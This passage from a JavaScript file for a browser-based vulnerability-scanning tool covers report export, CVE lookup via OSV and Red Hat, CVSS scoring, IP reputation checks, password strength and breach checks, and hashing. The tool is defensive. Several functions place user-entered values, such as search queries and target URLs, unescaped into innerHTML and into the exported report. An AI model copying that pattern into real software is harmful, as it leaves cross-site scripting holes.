      <td style="font-family:monospace;font-size:12px;word-break:break-all">${s.url}</td>
      <td style="text-transform:capitalize">${s.profile}</td>
      <td style="text-align:center;font-weight:700">${sv.length}</td>
      <td style="text-align:center;color:#dc2626;font-weight:700">${sv.filter(v => v.severity === 'critical').length}</td>
      <td style="text-align:center;color:#ea580c;font-weight:700">${sv.filter(v => v.severity === 'high').length}</td>
      <td style="font-size:12px;color:#6b7280;white-space:nowrap">${fmtDate(s.ts)}</td>
    </tr>`;
  }).join('');

  const sevBarRows = [['Critical', critCount, '#ef4444'], ['High', highCount, '#f97316'], ['Medium', medCount, '#eab308'], ['Low', lowCount, '#6366f1'], ['Info', infCount, '#22c55e']].map(([label, cnt, clr]) => {
    const pct = allVulns.length ? Math.round(cnt / allVulns.length * 100) : 0;
    return `<div style="display:flex;align-items:center;gap:14px;margin-bottom:10px">
      <div style="width:72px;font-size:12px;font-weight:700;color:${clr}">${label}</div>
      <div style="flex:1;background:#f1f5f9;border-radius:4px;height:10px;overflow:hidden"><div style="width:${pct}%;height:100%;background:${clr};border-radius:4px"></div></div>
      <div style="width:32px;text-align:right;font-size:13px;font-weight:800;color:${clr}">${cnt}</div>
    </div>`;
  }).join('');

  return `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>VulnScan Pro — Security Report</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f8fafc;color:#0f172a;font-size:14px;line-height:1.6}
.wrap{max-width:960px;margin:0 auto;padding:32px 24px}
.hdr{background:linear-gradient(120deg,#0e7490 0%,#6366f1 38%,#a21caf 68%,#b45309 100%);color:#fff;padding:40px 48px;border-radius:16px;margin-bottom:28px;position:relative;overflow:hidden}
.hdr::before{content:'';position:absolute;left:0;top:0;right:0;height:4px;background:linear-gradient(90deg,#22d3ee,#8b5cf6,#ec4899,#f59e0b)}
.hdr::after{content:'';position:absolute;right:-60px;top:-60px;width:260px;height:260px;background:rgba(255,255,255,.07);border-radius:50%}
.hdr-logo{font-size:12px;font-weight:700;letter-spacing:.12em;text-transform:uppercase;opacity:.6;margin-bottom:8px}
.hdr-title{font-size:30px;font-weight:900;margin-bottom:6px;position:relative;z-index:1}
.hdr-meta{font-size:13px;opacity:.65;position:relative;z-index:1}
.risk-chip{display:inline-flex;align-items:center;gap:12px;background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.2);border-radius:12px;padding:12px 20px;margin-top:20px;position:relative;z-index:1}
.risk-num{font-size:38px;font-weight:900;line-height:1}
.print-bar{background:#fff;border:1px solid #e2e8f0;border-radius:12px;padding:14px 20px;margin-bottom:20px;display:flex;align-items:center;justify-content:space-between;gap:12px;box-shadow:0 1px 3px rgba(0,0,0,.05)}
.pbtn{background:linear-gradient(120deg,#06b6d4,#6366f1,#db2777);color:#fff;border:none;padding:9px 18px;border-radius:8px;font-weight:700;font-size:13px;cursor:pointer}
.pbtn:hover{opacity:.9}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:12px;margin-bottom:24px}
.stat{background:#fff;border:1px solid #e2e8f0;border-radius:12px;padding:18px;text-align:center;box-shadow:0 1px 3px rgba(0,0,0,.04)}
.stat-v{font-size:32px;font-weight:900;line-height:1;margin-bottom:4px}
.stat-l{font-size:10px;color:#64748b;font-weight:700;text-transform:uppercase;letter-spacing:.06em}
.card{background:#fff;border:1px solid #e2e8f0;border-radius:12px;padding:22px;margin-bottom:18px;box-shadow:0 1px 3px rgba(0,0,0,.04)}
.card-title{font-size:15px;font-weight:800;padding-bottom:12px;border-bottom:2px solid #f1f5f9;margin-bottom:16px;display:flex;align-items:center;gap:7px}
table{width:100%;border-collapse:collapse}
th{background:#f8fafc;padding:10px 12px;text-align:left;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.05em;color:#64748b;border-bottom:2px solid #e2e8f0}
td{padding:10px 12px;border-bottom:1px solid #f1f5f9;vertical-align:top}
tr:last-child td{border-bottom:none}
.alert-box{border-radius:8px;padding:14px 16px;font-size:13px;margin-top:12px}
.footer{text-align:center;padding:24px;color:#94a3b8;font-size:11px;margin-top:4px}
@media print{body{background:#fff}.wrap{padding:16px}button{display:none!important}.hdr{-webkit-print-color-adjust:exact;print-color-adjust:exact}.card{break-inside:avoid}}
</style></head><body><div class="wrap">

<div class="print-bar">
  <div><strong style="font-size:15px">🛡️ VulnScan Pro</strong> <span style="color:#64748b;margin-left:8px;font-size:12px">Security Report · ${now}</span></div>
  <button class="pbtn" onclick="window.print()">🖨️ Print / Save as PDF</button>
</div>

<div class="hdr">
  <div class="hdr-logo">🛡️ VulnScan Pro — Vulnerability Assessment</div>
  <div class="hdr-title">Security Report</div>
  <div class="hdr-meta">Prepared by <strong>${user}</strong> &nbsp;·&nbsp; ${now} &nbsp;·&nbsp; ${scans.length} target${scans.length !== 1 ? 's' : ''} assessed</div>
  <div class="risk-chip">
    <div class="risk-num" style="color:${riskClr}">${riskScore}</div>
    <div><div style="font-weight:800;font-size:14px">Risk Score</div><div style="font-size:12px;opacity:.75">Overall: <strong style="color:${riskClr}">${riskLabel}</strong></div></div>
  </div>
</div>

<div class="grid">
  <div class="stat"><div class="stat-v" style="color:#6366f1">${scans.length}</div><div class="stat-l">Targets</div></div>
  <div class="stat"><div class="stat-v" style="color:#0f172a">${allVulns.length}</div><div class="stat-l">Total Issues</div></div>
  <div class="stat"><div class="stat-v" style="color:#dc2626">${critCount}</div><div class="stat-l">Critical</div></div>
  <div class="stat"><div class="stat-v" style="color:#ea580c">${highCount}</div><div class="stat-l">High</div></div>
  <div class="stat"><div class="stat-v" style="color:#d97706">${medCount}</div><div class="stat-l">Medium</div></div>
  <div class="stat"><div class="stat-v" style="color:#4f46e5">${lowCount}</div><div class="stat-l">Low</div></div>
</div>

<div class="card">
  <div class="card-title">📊 Severity Breakdown</div>
  ${sevBarRows}
</div>

<div class="card">
  <div class="card-title">📝 Executive Summary</div>
  <p style="color:#374151;line-height:1.75;margin-bottom:12px">
    This report summarises the results of a vulnerability assessment conducted against <strong>${scans.length} target${scans.length !== 1 ? 's' : ''}</strong>.
    The assessment identified <strong>${allVulns.length} security issue${allVulns.length !== 1 ? 's' : ''}</strong>
    ${critCount || highCount ? `, including <strong style="color:#dc2626">${critCount} critical</strong> and <strong style="color:#ea580c">${highCount} high-severity</strong> findings requiring immediate action.` : ' — no critical or high severity issues were found.'}
  </p>
  ${critCount || highCount
      ? `<div class="alert-box" style="background:#fef2f2;border:1px solid #fca5a5;color:#991b1b">⚠️ <strong>Action Required:</strong> ${critCount + highCount} critical/high issue${critCount + highCount !== 1 ? 's require' : 'requires'} immediate remediation.</div>`
      : `<div class="alert-box" style="background:#f0fdf4;border:1px solid #86efac;color:#166534">✅ No critical or high severity issues detected. Maintain current security posture.</div>`}
</div>

<div class="card">
  <div class="card-title">🔍 Scanned Targets</div>
  <table><thead><tr><th>Target URL</th><th>Profile</th><th>Issues</th><th>Critical</th><th>High</th><th>Date</th></tr></thead>
  <tbody>${scanRows || '<tr><td colspan="6" style="text-align:center;color:#94a3b8;padding:20px">No scans</td></tr>'}</tbody></table>
</div>

${allVulns.length ? `<div class="card">
  <div class="card-title">⚠️ Detailed Findings (${allVulns.length})</div>
  <table><thead><tr><th>#</th><th>Finding</th><th>Severity</th><th>Endpoint</th><th>Date</th></tr></thead>
  <tbody>${vulnRows}</tbody></table>
</div>` : ''}

<div class="card">
  <div class="card-title">🛡️ Recommendations</div>
  <ol style="padding-left:20px;color:#374151;line-height:2.1">
    <li>Remediate all <strong style="color:#dc2626">Critical</strong> and <strong style="color:#ea580c">High</strong> findings within 24–72 hours</li>
    <li>Schedule <strong style="color:#d97706">Medium</strong> severity fixes within the next sprint cycle</li>
    <li>Apply security headers: CSP, HSTS, X-Frame-Options, X-Content-Type-Options</li>
    <li>Implement a WAF as a defence-in-depth layer</li>
    <li>Establish regular scan cadence — weekly for production, daily for critical systems</li>
    <li>Conduct developer training focused on OWASP Top 10</li>
  </ol>
</div>

<div class="footer">Generated by VulnScan Pro &nbsp;·&nbsp; ${now} &nbsp;·&nbsp; Confidential — Internal use only</div>
</div></body></html>`;
}

function exportHTML(scanId) {
  const html = buildHTMLReport(scanId ? [scanId] : null);
  const scan = scanId ? state.scans.find(s => s.id === scanId) : null;
  const name = scan ? scan.url.replace(/[^a-z0-9]/gi, '-').slice(0, 30) : 'all-scans';
  download(html, `vulnscan-report-${name}.html`, 'text/html');
  toast('HTML report downloaded!', 'success');
}

function exportAllHTML() { exportHTML(null); }
function exportAllCSV() { exportCSV(null); }

function showVulnExportMenu() {
  document.getElementById('vuln-export-modal').style.display = 'flex';
}

function printReport(scanId) {
  const html = buildHTMLReport(scanId ? [scanId] : null);
  try {
    // Try blob URL approach first (better browser support)
    const blob = new Blob([html], { type: 'text/html' });
    const url = URL.createObjectURL(blob);
    const win = window.open(url, '_blank');
    if (!win) throw new Error('blocked');
    setTimeout(() => { URL.revokeObjectURL(url); }, 10000);
    toast('Report opened — use Ctrl+P / ⌘+P to save as PDF', 'info');
  } catch (e) {
    // Fallback: direct download of HTML file
    toast('Pop-ups blocked — downloading HTML file instead', 'info');
    exportHTML(scanId);
  }
}

function printScanReport(scanId) { printReport(scanId); }

function exportCSV(scanId) {
  const vulns = scanId ? state.vulns.filter(v => v.scanId === scanId) : state.vulns;
  const rows = ['#,Title,Severity,URL,Description,Date',
    ...vulns.sort((a, b) => { const o = { critical: 0, high: 1, medium: 2, low: 3, info: 4 }; return o[a.severity] - o[b.severity]; })
      .map((v, i) => `${i + 1},"${(v.title || '').replace(/"/g, '""')}","${v.severity}","${(v.url || '').replace(/"/g, '""')}","${(v.desc || '').replace(/"/g, '""').slice(0, 200)}","${fmtDate(v.ts)}"`)
  ].join('\n');
  const scan = scanId ? state.scans.find(s => s.id === scanId) : null;
  download(rows, `vulnscan-${scan ? scan.url.replace(/[^a-z0-9]/gi, '-').slice(0, 30) : 'all'}.csv`, 'text/csv');
  toast('CSV exported!', 'success');
}

function exportJSONReport(scanId) {
  const scan = scanId ? state.scans.find(s => s.id === scanId) : null;
  const vulns = scanId ? state.vulns.filter(v => v.scanId === scanId) : state.vulns;
  const payload = {
    generated: new Date().toISOString(), tool: 'VulnScan Pro',
    ...(scan ? { scan } : { scans: state.scans }),
    summary: { total: vulns.length, critical: vulns.filter(v => v.severity === 'critical').length, high: vulns.filter(v => v.severity === 'high').length, medium: vulns.filter(v => v.severity === 'medium').length, low: vulns.filter(v => v.severity === 'low').length, info: vulns.filter(v => v.severity === 'info').length },
    vulnerabilities: vulns
  };
  download(JSON.stringify(payload, null, 2), `vulnscan-${scan ? scan.url.replace(/[^a-z0-9]/gi, '-').slice(0, 30) : 'all'}.json`, 'application/json');
  toast('JSON exported!', 'success');
}

function download(content, filename, type) {
  try {
    const blob = new Blob([content], { type });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    a.style.display = 'none';
    document.body.appendChild(a);
    a.click();
    setTimeout(() => { URL.revokeObjectURL(url); document.body.removeChild(a); }, 1000);
  } catch (e) {
    // Fallback: data URI (works when file:// blocks createObjectURL)
    try {
      const b64 = btoa(unescape(encodeURIComponent(content)));
      const a = document.createElement('a');
      a.href = `data:${type};base64,${b64}`;
      a.download = filename;
      a.style.display = 'none';
      document.body.appendChild(a);
      a.click();
      setTimeout(() => document.body.removeChild(a), 1000);
    } catch (e2) {
      toast('Download failed: ' + e2.message, 'error');
    }
  }
}

// ==================== TOOLS ====================
// CVSS vector → numeric base score (CVSS 3.x). Used when a source gives only the vector.
function cvss3FromVector(vec) {
  if (!vec || typeof vec !== 'string') return null;
  try {
    const p = {}; vec.replace(/^CVSS:3\.[01]\//i, '').split('/').forEach(kv => { const [k, v] = kv.split(':'); if (k && v) p[k] = v; });
    const AV = { N: 0.85, A: 0.62, L: 0.55, P: 0.2 }[p.AV];
    const AC = { L: 0.77, H: 0.44 }[p.AC];
    const UI = { N: 0.85, R: 0.62 }[p.UI];
    const scoped = p.S === 'C';
    const PR = p.PR === 'N' ? 0.85 : p.PR === 'L' ? (scoped ? 0.68 : 0.62) : p.PR === 'H' ? (scoped ? 0.5 : 0.27) : null;
    const cia = { H: 0.56, L: 0.22, N: 0 };
    if (AV == null || AC == null || UI == null || PR == null || !(p.C in cia) || !(p.I in cia) || !(p.A in cia)) return null;
    const iscBase = 1 - (1 - cia[p.C]) * (1 - cia[p.I]) * (1 - cia[p.A]);
    const isc = scoped ? 7.52 * (iscBase - 0.029) - 3.25 * Math.pow(iscBase - 0.02, 15) : 6.42 * iscBase;
    const exp = 8.22 * AV * AC * PR * UI;
    if (isc <= 0) return 0;
    const raw = scoped ? Math.min(1.08 * (isc + exp), 10) : Math.min(isc + exp, 10);
    return Math.ceil(raw * 10) / 10;
  } catch { return null; }
}

function cvssSeverity(score) {
  if (score == null) return '—';
  if (score === 0) return 'NONE';
  if (score < 4) return 'LOW';
  if (score < 7) return 'MEDIUM';
  if (score < 9) return 'HIGH';
  return 'CRITICAL';
}

async function cveLookup() {
  const q = document.getElementById('cve-input').value.trim();
  if (!q) { toast('Enter a CVE ID or keyword', 'error'); return; }
  const el = document.getElementById('cve-result');
  el.classList.add('show');
  const sevBadge = s => ({ CRITICAL: 'bc', HIGH: 'bh', MEDIUM: 'bm', LOW: 'bl', NONE: 'bi' }[String(s).toUpperCase()] || 'bi');
  const isCveId = /^CVE-\d{4}-\d{4,}$/i.test(q);

  if (isCveId) {
    await cveById(q.toUpperCase(), el, sevBadge);
  } else {
    await cveKeyword(q, el, sevBadge);
  }
}

// Render a single normalised CVE record
function renderCveCard(r, sevBadge) {
  const score = r.cvss;
  const sev = r.severity || cvssSeverity(score);
  const published = r.published ? new Date(r.published).toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' }) : '';
  const refs = (r.references || []).slice(0, 3);
  const cwes = (r.cwes || []).slice(0, 2);
  const desc = r.description || 'No description available';
  return `<div style="padding:12px;background:rgba(255,255,255,.04);border-radius:10px;margin-top:10px;border:1px solid var(--border)">
        <div style="display:flex;justify-content:space-between;align-items:flex-start;gap:8px;margin-bottom:6px">
          <a href="https://nvd.nist.gov/vuln/detail/${r.id}" target="_blank" style="font-weight:800;color:var(--cyan);text-decoration:none;font-size:13px">${r.id} ↗</a>
          <div style="display:flex;gap:5px;flex-shrink:0;flex-wrap:wrap;justify-content:flex-end">
            ${score != null ? `<span class="badge ${sevBadge(sev)}">CVSS ${score}</span>` : ''}
            ${sev !== '—' ? `<span class="badge ${sevBadge(sev)}">${sev}</span>` : ''}
          </div>
        </div>
        <div style="font-size:11.5px;color:var(--text2);margin-bottom:7px;line-height:1.55">${desc.slice(0, 280)}${desc.length > 280 ? '…' : ''}</div>
        <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center">
          ${published ? `<span style="font-size:10.5px;color:var(--text3)">📅 ${published}</span>` : ''}
          ${r.source ? `<span style="font-size:10px;color:var(--text3)">via ${r.source}</span>` : ''}
          ${cwes.map(w => `<span class="badge bi" style="font-size:10px">${w}</span>`).join('')}
          ${refs.length ? `<span style="font-size:10.5px;color:var(--text3);margin-left:auto">${refs.map(u => `<a href="${u}" target="_blank" style="color:var(--cyan);margin-left:6px">ref ↗</a>`).join('')}</span>` : ''}
        </div>
      </div>`;
}

// Exact CVE ID — query Red Hat (numeric CVSS) and OSV (description/refs) in parallel, merge.
async function cveById(id, el, sevBadge) {
  el.innerHTML = '<div class="ph"><span class="spin"></span> Querying OSV.dev + Red Hat…</div>';
  const fetchJson = async (url, opts) => {
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), 12000);
    try { const res = await fetch(url, { ...(opts || {}), signal: ctrl.signal }); clearTimeout(t); return res.ok ? await res.json() : null; }
    catch { clearTimeout(t); return null; }
  };
  const [osv, rh] = await Promise.all([
    fetchJson(`https://api.osv.dev/v1/vulns/${encodeURIComponent(id)}`),
    fetchJson(`https://access.redhat.com/hydra/rest/securitydata/cve/${encodeURIComponent(id)}.json`)
  ]);

  if (!osv && !rh) {
    el.innerHTML = `<div class="ph">No data found for "<strong>${id}</strong>" in OSV or Red Hat. <a href="https://nvd.nist.gov/vuln/detail/${id}" target="_blank" style="color:var(--cyan)">↗ Check NVD directly</a></div>`;
    return;
  }

  const rec = { id, references: [], cwes: [], source: [] };
  if (rh) {
    rec.description = Array.isArray(rh.details) ? rh.details.join(' ') : (rh.details || rh.bugzilla?.description);
    rec.published = rh.public_date;
    const score = rh.cvss3?.cvss3_base_score ? parseFloat(rh.cvss3.cvss3_base_score) : null;
    if (score != null && !isNaN(score)) rec.cvss = score;
    if (rh.threat_severity) rec.severity = rh.threat_severity.toUpperCase();
    if (rh.cwe) rec.cwes.push(rh.cwe.split('->').pop().trim());
    (rh.references || []).slice(0, 3).forEach(u => rec.references.push(typeof u === 'string' ? u : u.url || ''));
    rec.source.push('Red Hat');
  }
  if (osv) {
    if (!rec.description) rec.description = osv.details;
    if (!rec.published) rec.published = osv.published;
    if (rec.cvss == null) {
      const v = (osv.severity || []).find(s => /CVSS_V3/i.test(s.type));
      const sc = v && cvss3FromVector(v.score);
      if (sc != null) { rec.cvss = sc; rec.severity = rec.severity || cvssSeverity(sc); }
    }
    if (!rec.references.length) (osv.references || []).slice(0, 3).forEach(r => rec.references.push(r.url));
    rec.source.push('OSV.dev');
  }
  rec.source = rec.source.join(' + ');
  el.innerHTML = renderCveCard(rec, sevBadge);
}

// Keyword search — Red Hat Security Data CVE list (package/text match), CORS-enabled.
async function cveKeyword(q, el, sevBadge) {
  el.innerHTML = '<div class="ph"><span class="spin"></span> Searching Red Hat Security Data…</div>';
  try {
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), 15000);
    const res = await fetch(`https://access.redhat.com/hydra/rest/securitydata/cve.json?package=${encodeURIComponent(q)}&per_page=10`, { signal: ctrl.signal });
    clearTimeout(t);
    if (!res.ok) throw new Error('Red Hat API returned ' + res.status);
    const list = await res.json();
    if (!Array.isArray(list) || !list.length) {
      el.innerHTML = `<div class="ph">No CVEs found for package/keyword "<strong>${q}</strong>". Try an exact CVE ID, or <a href="https://www.cve.org/CVERecord/SearchResults?query=${encodeURIComponent(q)}" target="_blank" style="color:var(--cyan)">↗ search cve.org</a></div>`;
      return;
    }
    el.innerHTML = list.slice(0, 10).map(c => renderCveCard({
      id: c.CVE,
      description: c.bugzilla_description || 'No description available',
      published: c.public_date,
      cvss: c.cvss_score != null ? parseFloat(c.cvss_score) : (c.cvss3_score != null ? parseFloat(c.cvss3_score) : null),
      severity: c.severity ? c.severity.toUpperCase() : null,
      cwes: c.CWE ? [c.CWE.split('->').pop().trim()] : [],
      references: c.resource_url ? [c.resource_url] : [],
      source: 'Red Hat'
    }, sevBadge)).join('');
  } catch (e) {
    el.innerHTML = `<div class="ph" style="color:var(--red)">CVE search failed — ${e.message}. <a href="https://www.cve.org/CVERecord/SearchResults?query=${encodeURIComponent(q)}" target="_blank" style="color:var(--cyan)">↗ Try cve.org</a></div>`;
  }
}

async function lookupMyIP() {
  try {
    // Try multiple services to detect own IP
    const sources = ['https://api.ipify.org?format=json', 'https://api.my-ip.io/v2/ip.json', 'https://ipapi.co/json/'];
    for (const src of sources) {
      try {
        const res = await fetch(src, { signal: AbortSignal.timeout(5000) });
        const d = await res.json();
        const ip = d.ip || d.ipAddress;
        if (ip) {
          document.getElementById('ip-input').value = ip;
          toast('Your IP: ' + ip, 'info');
          ipRepCheck();
          return;
        }
      } catch { continue; }
    }
    throw new Error('All IP detection services failed');
  } catch (e) { toast('Could not detect IP: ' + e.message, 'error'); }
}

async function ipRepCheck() {
  const ip = document.getElementById('ip-input').value.trim();
  if (!ip) { toast('Enter an IP address', 'error'); return; }
  const el = document.getElementById('ip-result');
  el.classList.add('show');
  el.innerHTML = '<div class="ph"><span class="spin"></span> Checking reputation…</div>';

  // Try multiple free APIs in order until one works
  const apis = [
    {
      name: 'ipapi.co',
      url: `https://ipapi.co/${encodeURIComponent(ip)}/json/`,
      parse: d => {
        if (d.error) throw new Error(d.reason || d.error);
        return {
          ip: d.ip,
          country: `${d.country_name || '—'} (${d.country_code || '—'})`,
          region: d.region || '—',
          city: d.city || '—',
          postal: d.postal || '—',
          timezone: d.timezone || '—',
          isp: d.org || '—',
          asn: d.asn || '—',
          lat: d.latitude,
          lon: d.longitude,
          vpn: false, // ipapi.co free tier doesn't expose this
          tor: false,
        };
      }
    },
    {
      name: 'freeipapi.com',
      url: `https://free.freeipapi.com/api/json/${encodeURIComponent(ip)}`,
      parse: d => {
        if (!d.ipAddress) throw new Error('No data returned');
        return {
          ip: d.ipAddress,
          country: `${d.countryName || '—'} (${d.countryCode || '—'})`,
          region: d.regionName || '—',
          city: d.cityName || '—',
          postal: d.zipCode || '—',
          timezone: d.timeZone || '—',
          isp: d.isp || '—',
          asn: '—',
          lat: d.latitude,
          lon: d.longitude,
          vpn: d.isProxy === 1,
          tor: false,
        };
      }
    },
    {
      name: 'ip.sb',
      url: `https://api.ip.sb/geoip/${encodeURIComponent(ip)}`,
      parse: d => {
        if (!d.ip) throw new Error('No data returned');
        return {
          ip: d.ip,
          country: `${d.country || '—'} (${d.country_code || '—'})`,
          region: d.region || '—',
          city: d.city || '—',
          postal: d.postal_code || '—',
          timezone: d.timezone || '—',
          isp: d.isp || '—',
          asn: d.asn ? 'AS' + d.asn : '—',
          lat: d.latitude,
          lon: d.longitude,
          vpn: false,
          tor: false,
        };
      }
    }
  ];

  let lastErr = '';
  for (const api of apis) {
    try {
      el.innerHTML = `<div class="ph"><span class="spin"></span> Trying ${api.name}…</div>`;
      const ctrl = new AbortController();
      const t = setTimeout(() => ctrl.abort(), 7000);
      const res = await fetch(api.url, { signal: ctrl.signal });
      clearTimeout(t);
      if (!res.ok) throw new Error(`${api.name} returned ${res.status}`);
      const d = await res.json();
      const info = api.parse(d);

      // ── Render result ──────────────────────────────────────────────
      const threatColor = (info.vpn || info.tor) ? 'var(--orange)' : 'var(--green)';
      const rows = [
        ['🌐 IP', info.ip],
        ['📍 Country', info.country],
        ['🏙️ Region', info.region],
        ['🏘️ City', info.city],
        ['📮 Postal', info.postal],
        ['🕐 Timezone', info.timezone],
        ['🏢 ISP / Org', info.isp],
        ['🔢 ASN', info.asn],
        ['🔒 VPN/Proxy', info.vpn ? '⚠️ Detected' : '✅ Clean'],
        ['🧅 Tor', info.tor ? '⚠️ Exit Node' : '✅ No'],
      ];

      el.innerHTML = `
        <div style="padding:12px;background:rgba(255,255,255,.04);border-radius:10px;margin-top:8px;border:1px solid var(--border)">
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;padding-bottom:8px;border-bottom:1px solid var(--border)">
            <span style="font-size:13px;font-weight:800;font-family:var(--mono);color:var(--cyan)">${info.ip}</span>
            <div style="display:flex;gap:6px;align-items:center">
              <span style="font-size:10px;color:var(--text3)">via ${api.name}</span>
              <span style="font-size:11px;font-weight:700;padding:2px 10px;border-radius:12px;background:rgba(0,0,0,.2);color:${threatColor}">
                ${(info.vpn || info.tor) ? '⚠️ Suspicious' : '✅ Clean'}
              </span>
            </div>
          </div>
          <div style="display:grid;grid-template-columns:auto 1fr;gap:2px 14px">
            ${rows.map(([k, v]) => `
              <span style="font-size:11.5px;color:var(--text3);padding:3px 0;white-space:nowrap">${k}</span>
              <span style="font-size:11.5px;font-weight:600;padding:3px 0;text-align:right;word-break:break-all">${v}</span>`).join('')}
          </div>
          ${info.lat && info.lon ? `
          <div style="margin-top:10px;padding-top:8px;border-top:1px solid var(--border)">
            <a href="https://maps.google.com/?q=${info.lat},${info.lon}" target="_blank"
               style="font-size:11.5px;color:var(--cyan);text-decoration:none">🗺️ View on Google Maps ↗</a>
          </div>` : ''}
        </div>`;
      return; // success — stop trying more APIs

    } catch (e) {
      lastErr = e.name === 'AbortError' ? 'Request timed out' : e.message;
      continue; // try next API
    }
  }

  // All APIs failed
  el.innerHTML = `
    <div style="padding:12px;background:rgba(239,68,68,.07);border:1px solid rgba(239,68,68,.2);border-radius:8px;margin-top:8px;font-size:12.5px">
      <div style="color:var(--red);font-weight:700;margin-bottom:4px">❌ All IP lookup APIs failed</div>
      <div style="color:var(--text3);font-size:11.5px">Last error: ${lastErr}</div>
      <div style="margin-top:8px;display:flex;gap:8px;flex-wrap:wrap">
        <a href="https://www.shodan.io/host/${encodeURIComponent(ip)}" target="_blank" style="font-size:11.5px;color:var(--cyan)">↗ Shodan</a>
        <a href="https://www.abuseipdb.com/check/${encodeURIComponent(ip)}" target="_blank" style="font-size:11.5px;color:var(--cyan)">↗ AbuseIPDB</a>
        <a href="https://ipinfo.io/${encodeURIComponent(ip)}" target="_blank" style="font-size:11.5px;color:var(--cyan)">↗ ipinfo.io</a>
      </div>
    </div>`;
}

function checkPw(pw) {
  const bars = document.querySelectorAll('.pw-bar');
  const lbl = document.getElementById('pw-lbl');
  const det = document.getElementById('pw-details');
  if (!pw) { bars.forEach(b => b.style.background = 'rgba(255,255,255,.08)'); lbl.textContent = 'Enter a password above'; det.innerHTML = ''; return; }

  let score = 0;
  if (pw.length >= 8) score++;
  if (pw.length >= 12) score++;
  if (/[A-Z]/.test(pw) && /[a-z]/.test(pw)) score++;
  if (/[0-9]/.test(pw)) score++;
  if (/[^A-Za-z0-9]/.test(pw)) score++;

  const colors = ['#ef4444', '#f97316', '#eab308', '#22c55e', '#6366f1'];
  const labels = ['Very Weak', 'Weak', 'Fair', 'Strong', 'Very Strong'];
  bars.forEach((b, i) => b.style.background = i < score ? colors[score - 1] : 'rgba(255,255,255,.08)');
  lbl.textContent = labels[score - 1] || 'Very Weak';

  const entropy = Math.round(pw.length * Math.log2(
    (/[a-z]/.test(pw) ? 26 : 0) + (/[A-Z]/.test(pw) ? 26 : 0) +
    (/[0-9]/.test(pw) ? 10 : 0) + (/[^A-Za-z0-9]/.test(pw) ? 32 : 0) || 26
  ));
  det.innerHTML = `<div style="font-size:11.5px;color:var(--text3);margin-top:4px">Length: <strong style="color:var(--text)">${pw.length}</strong> &nbsp;·&nbsp; Entropy: <strong style="color:var(--text)">~${entropy} bits</strong></div>`;
}

async function hibpCheck() {
  const pw = document.getElementById('pw-input').value;
  if (!pw) { toast('Enter a password first', 'error'); return; }
  const el = document.getElementById('pw-hibp');
  const btn = document.getElementById('hibp-btn');
  btn.disabled = true;
  btn.innerHTML = '<span class="spin"></span> Checking…';
  el.innerHTML = '';
  try {
    // k-anonymity: only send first 5 chars of SHA-1 hash
    const enc = new TextEncoder().encode(pw);
    const buf = await crypto.subtle.digest('SHA-1', enc);
    const hash = Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('').toUpperCase();
    const prefix = hash.slice(0, 5);
    const suffix = hash.slice(5);
    const res = await fetch(`https://api.pwnedpasswords.com/range/${prefix}`, {
      headers: { 'Add-Padding': 'true' }
    });
    if (!res.ok) throw new Error('HIBP API returned ' + res.status);
    const text = await res.text();
    const lines = text.split('\n');
    const match = lines.find(l => l.startsWith(suffix));
    const count = match ? parseInt(match.split(':')[1].trim()) : 0;
    if (count > 0) {
      el.innerHTML = `<div style="padding:10px 12px;background:rgba(239,68,68,.12);border:1px solid rgba(239,68,68,.25);border-radius:8px;font-size:12.5px">
        <div style="font-weight:700;color:#fca5a5;margin-bottom:3px">⚠️ Pwned! Found in ${count.toLocaleString()} data breach${count > 1 ? 'es' : ''}</div>
        <div style="color:var(--text3);font-size:11.5px">This password has appeared in known data breaches. Do not use it.</div>
      </div>`;
      toast('Password found in ' + count.toLocaleString() + ' breaches!', 'error');
    } else {
      el.innerHTML = `<div style="padding:10px 12px;background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);border-radius:8px;font-size:12.5px">
        <div style="font-weight:700;color:#86efac;margin-bottom:3px">✅ Not found in any known breaches</div>
        <div style="color:var(--text3);font-size:11.5px">This password wasn't found in the HIBP database. Still use a strong, unique password.</div>
      </div>`;
      toast('Password not found in breaches ✅', 'success');
    }
  } catch (e) {
    el.innerHTML = `<div style="padding:8px 12px;background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2);border-radius:8px;font-size:12px;color:var(--red)">HIBP check failed: ${e.message}</div>`;
    toast('HIBP check failed', 'error');
  } finally {
    btn.disabled = false;
    btn.innerHTML = '🔎 Check Data Breaches (HIBP)';
  }
}

async function genHash() {
  const text = document.getElementById('hash-input').value;
  if (!text) { toast('Enter text to hash', 'error'); return; }
  const el = document.getElementById('hash-result');
  el.style.display = 'block';
  el.innerHTML = '<div style="color:var(--text3);font-size:12px;padding:8px 0"><span class="spin"></span> Generating…</div>';
  try {
    const enc = new TextEncoder().encode(text);
    const algs = ['SHA-1', 'SHA-256', 'SHA-384', 'SHA-512'];
    const results = await Promise.all(algs.map(async a => {
      const buf = await crypto.subtle.digest(a, enc);
      return [a, Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('')];
    }));
    el.innerHTML = results.map(([a, h]) =>
      `<div style="margin-bottom:10px">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:3px">
          <div style="font-size:10px;color:var(--text3);font-weight:700">${a}</div>
          <button class="btn btn-g btn-xs" onclick="navigator.clipboard.writeText('${h}');toast('Copied!','success')" style="font-size:10px">📋 Copy</button>
        </div>
        <div style="font-family:var(--mono);font-size:10.5px;word-break:break-all;background:rgba(0,0,0,.3);padding:6px 8px;border-radius:6px;color:var(--cyan)">${h}</div>
      </div>`
    ).join('');
  } catch (e) {
